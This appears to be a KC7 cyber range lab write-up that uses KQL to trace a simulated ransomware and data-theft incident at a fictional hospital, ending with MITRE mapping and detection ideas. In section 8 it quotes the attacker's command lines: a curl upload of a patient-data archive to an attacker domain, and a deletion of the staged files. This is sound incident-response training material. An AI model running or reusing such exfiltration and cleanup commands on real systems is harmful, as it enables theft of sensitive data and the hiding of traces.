# KC7 — LockByte Ransomware Investigation (JoJo's Hospital)

**Platform:** KC7 Cyber Range
**Scenario:** Ransomware deployment and data exfiltration against a healthcare provider
**Tooling:** KQL

---

## Summary

A threat actor group operating as **LockByte** compromised JoJo's Hospital, exfiltrated patient records to an attacker-controlled domain, then deployed ransomware across the estate and demanded a $10,000 ransom.

This write-up covers how I traced the incident from the first encrypted files back to patient zero, identified the tooling used, and pivoted on attacker infrastructure to uncover a second domain and confirmed account compromise.

**Headline findings:**

| | |
|---|---|
| Hosts encrypted | 321 |
| Patient zero | `AMFB-MACHINE` (user: Anthony Davis) |
| Compromise time | 17 June 2024, 14:23:25 |
| Data exfiltrated | 3 zip archives of patient records |
| Attacker domains | `secure-health-access.com`, `emr-help.net` |
| Attacker IPs | `203.0.113.1`, `203.0.113.2` |

---

## 1. Establishing scope

First question: how widely did this spread? The ransomware appends `.encrypted` to files it locks, so counting distinct hosts with those files gives the blast radius.

```kql
FileCreationEvents
| where filename endswith ".encrypted"
| distinct hostname
| count
```

**Result: 321 hosts encrypted.**

---

## 2. Locating the ransom note

The actor dropped a ransom note with a consistent filename. Finding it would give me a host to start from.

```kql
FileCreationEvents
| where filename == "We_Have_Your_Data_Pay_Up.txt"
```

**Result:** a single host, `AMFB-MACHINE`, path `C:\Users\andavis\Documents\We_Have_Your_Data_Pay_Up.txt`.

Only one note across 321 encrypted hosts is itself informative — it suggests this machine was the origin rather than just another victim.

---

## 3. Identifying the user

```kql
Employees
| where hostname == "AMFB-MACHINE"
```

**Result:** Anthony Davis. The username `andavis` in the file path matches, confirming the host-to-user mapping.

---

## 4. Patient zero — process activity

With a host and a rough timeframe, I pulled process events for the day of the incident.

```kql
ProcessEvents
| where hostname == "AMFB-MACHINE"
| where timestamp between (datetime(2024-06-17) .. datetime(2024-06-18))
```

**Result:** activity beginning **17 June 2024 at 14:23:25** showing patient data being collected and staged for encryption. This established `AMFB-MACHINE` as patient zero.

![Process events on AMFB-MACHINE](investigations/Images/Screenshot 2026-08-28 122646.png)
---

## 5. The ransomware binary

One command line in those results referenced "ransomer", so I filtered on it.

```kql
ProcessEvents
| where hostname == "AMFB-MACHINE" and process_commandline contains "ransomer"
```

**Result:** `lockbyte_ransomer.exe`, along with `spread_ransomware.exe` staged to the network share `\\jojos-hospital.org`.

Placing the payload on a shared drive is how 321 hosts were reached from a single compromise — any machine with access to that share could execute it.

---

## 6. The exfiltration tool

```kql
ProcessEvents
| where hostname == "AMFB-MACHINE" and process_commandline contains ".exe"
| where timestamp between (datetime(2024-06-17) .. datetime(2024-06-18))

FileCreationEvents
| where filename contains "patient_data"
```

**Result:** `patient_data_exporter.exe` — a purpose-built tool for collecting patient records prior to exfiltration.

---

## 7. Staged data

The stolen data was packaged into three zip archives. I wasn't immediately sure whether the network path would appear in `ProcessEvents` or `FileCreationEvents`, so I checked the command lines first.

```kql
ProcessEvents
| where process_commandline contains "patient_data_1.zip"
```

**Result:** all three archives staged at `\\jojos-hospital-server\important_data\patient_records`.

---

## 8. Exfiltration and anti-forensics

The command lines revealed both how the data left the network and the cleanup afterwards.

**Exfiltration via curl:**
```
cmd.exe /c curl -T C:\Users\andavis\Documents\patient_data_1.zip https://secure-health-access.com/upload/patient_data_1.zip
```

**Anti-forensics — deleting the staged archives:**
```
cmd.exe /c del C:\Users\andavis\Documents\patient_data_*.zip
```

The deletion attempt failed to hide anything here, because the process execution itself was still logged. Worth noting as a detection point: the `del` command is as much of an indicator as the exfiltration.

---

## 9. Pivoting on attacker infrastructure

The curl command exposed an attacker-controlled domain. Resolving it gave me IPs to pivot from.

```kql
PassiveDns
| where domain == "secure-health-access.com"
```

**Result:** `203.0.113.1` and `203.0.113.2`.

Pivoting on those IPs to find other domains hosted on the same infrastructure:

```kql
PassiveDns
| where ip in ("203.0.113.1", "203.0.113.2")
```

**Result:** a second attacker domain — **`emr-help.net`**. Both names impersonate healthcare IT services, which fits the targeting.

---

## 10. Reconnaissance

With confirmed attacker IPs, I checked what they had been doing against the hospital's public website before the compromise.

```kql
InboundNetworkEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
```

**Result:** search queries showing clear intent —

- `https://jojoshospital.org/search=how+to+bypass+security+JoJo's+Hospital`
- `https://jojoshospital.org/search=JoJo's+Hospital+patient+records`

Reconnaissance focused on both circumventing controls and locating patient data.

---

## 11. Account compromise

```kql
AuthenticationEvents
| where src_ip in ("203.0.113.1", "203.0.113.2")
```

**Result:** successful authentication from attacker infrastructure to `MAIL-SERVER01`, using **Anthony Davis's account** — the same user as patient zero.

---

## Attack chain

```
Reconnaissance against public website (203.0.113.1/.2)
        ↓
Authentication as Anthony Davis from attacker IP → MAIL-SERVER01
        ↓
Compromise of AMFB-MACHINE (17 Jun 2024, 14:23:25)
        ↓
patient_data_exporter.exe collects patient records
        ↓
Data staged as 3 zips → \\jojos-hospital-server\important_data\patient_records
        ↓
Exfiltration via curl → secure-health-access.com
        ↓
Anti-forensics: del patient_data_*.zip
        ↓
lockbyte_ransomer.exe + spread_ransomware.exe staged to network share
        ↓
321 hosts encrypted
```

---

## MITRE ATT&CK mapping

| Tactic | Technique |
|---|---|
| Reconnaissance | T1594 — Search Victim-Owned Websites |
| Valid Accounts | T1078 — Valid Accounts |
| Execution | T1059.003 — Windows Command Shell |
| Collection | T1005 — Data from Local System |
| Lateral Movement | T1080 — Taint Shared Content |
| Exfiltration | T1048 — Exfiltration Over Alternative Protocol |
| Defence Evasion | T1070.004 — File Deletion |
| Impact | T1486 — Data Encrypted for Impact |

---

## What I could not establish

Being explicit about the limits of what the data supports:

- **Initial access.** I confirmed the attacker authenticated as Anthony Davis from their own IP, but I could not determine how those credentials were obtained. Phishing, credential stuffing and prior compromise are all consistent with what I found — I have no evidence favouring any of them.

- **Whether the reconnaissance directly led to the compromise.** The searches and the intrusion come from the same IPs, but sequence is not causation and I did not find a link between the two.

- **Whether other accounts were compromised.** I pivoted only on the two known attacker IPs. If the actor authenticated from other infrastructure, it would not appear in my results.

- **Full exfiltration volume.** I confirmed three archives by name. I did not establish total data volume or whether anything left by another route.

---

## Detection opportunities

Working backwards from the chain, points where this could have been caught earlier:

1. **Mass file extension change.** 321 hosts writing `.encrypted` files should trigger long before it reaches that scale. A threshold on distinct hosts writing an unusual extension within a short window catches this at host 5, not 321.

2. **curl to an external domain carrying an archive.** `curl -T` uploading a `.zip` to a non-corporate domain is rarely legitimate on a workstation.

3. **Authentication from an unrecognised external IP.** The login as Anthony Davis came from infrastructure with no prior history against the estate.

4. **Executables written to a network share.** `spread_ransomware.exe` appearing on a shared drive is high-signal and low-noise.

5. **Bulk deletion following bulk archive creation.** `del patient_data_*.zip` immediately after creating those archives is a strong anti-forensics indicator.

---

## Reflection

The most useful step was pivoting on the resolved IPs rather than stopping at the first domain. That single move surfaced a second piece of attacker infrastructure and, in turn, the reconnaissance and the compromised account — none of which were reachable from the host evidence alone.

The clearest lesson was how much sat in `process_commandline`. The exfiltration method, the destination, the anti-forensics and the tooling were all recoverable from command line arguments alone.
